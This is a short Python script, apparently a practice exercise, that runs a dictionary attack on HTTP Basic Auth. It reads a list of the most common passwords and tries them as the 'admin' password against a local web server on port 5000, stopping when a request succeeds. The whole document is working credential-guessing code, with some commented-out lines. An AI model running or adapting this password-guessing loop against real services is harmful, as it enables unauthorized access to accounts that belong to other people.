import requests
import base64
from requests.auth import HTTPBasicAuth

f = open("10k-most-common-passwords.txt", "r+")

lines = f.read()
lines = lines.split("\n")
for i in range(0, 10):
    # print(line)
    line = lines[i].strip()
    # encoded = line.encode("ascii")
    # encoded64 = base64.b64encode(encoded)
    x = requests.get('http://localhost:5000/', 
        # headers = {
        #     "Auhorization": "Basic " + encoded
        # })
        auth=HTTPBasicAuth("admin", line)
    )
    print(x)
    if x.status_code == 200:
        print("Password found")
        break
